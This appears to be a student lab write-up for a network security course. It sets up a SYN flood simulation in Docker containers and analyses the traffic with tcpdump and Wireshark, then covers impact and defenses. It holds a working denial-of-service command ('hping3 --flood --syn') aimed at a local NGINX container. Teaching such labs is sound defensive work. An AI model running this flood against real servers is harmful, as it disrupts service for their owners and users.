# SYN Flood Attack Simulation with Docker

**Lab Setup and Traffic Analysis**  
*Erwin Bruno - July 26, 2025*  
*Secure Network Engineering (CYBR-508-02P)*

## Objective

This lab provides hands-on experience with SYN flood attacks, a common form of Denial of Service (DoS). It guides you through building a Docker-based testing environment and developing skills in network traffic analysis using tcpdump and Wireshark.

## Prerequisites

- Docker installed and running
- Wireshark installed on host machine
- Basic understanding of TCP/IP networking
- Administrative privileges for Docker operations

## Lab Setup

### 1. Create Docker Network

```bash
docker network create --driver bridge syn_flood_network
```

### 2. Set Up Target Container (NGINX)

Create the target container with limited resources:
```bash
docker run -dit --name target --network syn_flood_network --cpus="0.2" --memory="256m" --cap-add=NET_ADMIN nginx
```

Enter the target container:
```bash
docker exec -it target bash
```

Inside the target container, update and install tools:
```bash
apt update && apt install iproute2 -y
```

Throttle bandwidth:
```bash
tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 400ms
```

Prepare directory and install tcpdump:
```bash
mkdir -p /mnt/data
apt update && apt install tcpdump -y
```

### 3. Set Up Attacker Container

Create and enter the attacker container:
```bash
docker run -it --name attacker --network syn_flood_network ubuntu /bin/bash
```

Inside the attacker container, install hping3:
```bash
apt update && apt install hping3 -y
```

## Attack Execution

### Launch the SYN Flood Attack

Open a new terminal and run inside the attacker container:
```bash
hping3 --flood --syn --destport 80 target
```

## Packet Capture

### Capture Traffic on Target

In the target container, start tcpdump:
```bash
tcpdump -i eth0 'tcp[tcpflags] == tcp-syn' and not port 22 -w /mnt/data/syn_flood_capture.pcap
```

Stop capture with `Ctrl+C` when sufficient data is collected.

### Download and Analyze

Copy the PCAP file from container to host (replace `{Username}` with your username):
```bash
docker cp target:/mnt/data/syn_flood_capture.pcap C:\Users\{Username}\Downloads\
```

Open `syn_flood_capture.pcap` with Wireshark for analysis.

## Cleanup

Stop and remove containers and network:
```bash
docker container stop target attacker
docker container rm target attacker
docker network rm syn_flood_network
```

## Results and Observations

The SYN flood attack successfully demonstrated service disruption. Wireshark analysis revealed:

- **Continuous SYN packet transmission** with no corresponding SYN-ACK responses
- **Connection table exhaustion** confirmed through traffic patterns
- **Disrupted TCP three-way handshake** process
- **Resource consumption** from managing half-open connections
- **Impact on legitimate traffic** due to connection table exhaustion

### Key Findings

- Connection attempts from attacker were not properly completed
- TCP three-way handshake process was disrupted
- Server resources were consumed managing half-open connections
- Legitimate traffic would be impacted due to connection table exhaustion

## Real-World Implications

### Attack Characteristics

SYN flood attacks pose significant threats to network infrastructure because:

- They require **minimal resources from the attacker**
- They can **overwhelm servers** with limited connection handling capacity
- They are **difficult to distinguish** from legitimate high-traffic periods initially
- **Small devices and budget servers** are particularly vulnerable

### Organizations at Risk

- **Small businesses** with limited server resources
- **IoT device manufacturers** with minimal security implementations
- **Legacy systems** without modern TCP stack protections
- **Services without proper rate limiting** or DDoS protection

### Business Impact

Successful SYN flood attacks can result in:

- Service unavailability during peak business hours
- Revenue loss for e-commerce platforms
- Customer dissatisfaction and reputation damage
- Increased operational costs for incident response

## Defense Strategies

### Technical Mitigations

- **SYN Cookies** - Allow servers to handle connections without storing state
- **Rate Limiting** - Block suspicious traffic patterns
- **Timeout Tuning** - Reduce connection timeout values
- **Firewall Rules** - iptables and cloud-based DDoS protection

### Infrastructure Solutions

- Load balancers with traffic filtering
- Cloud-based DDoS protection services
- Network monitoring and alerting systems
- Proper resource allocation and scaling

## Educational Value

This lab demonstrates:

- Practical attack execution in controlled environment
- Network traffic analysis techniques
- Real-world security implications
- Defensive strategy development
- Docker containerization for security testing

## Disclaimer

⚠️ **For Educational Purposes Only**

This lab is designed for educational purposes in controlled environments. Do not use these techniques against systems you do not own or without explicit permission. Unauthorized network attacks are illegal and unethical.
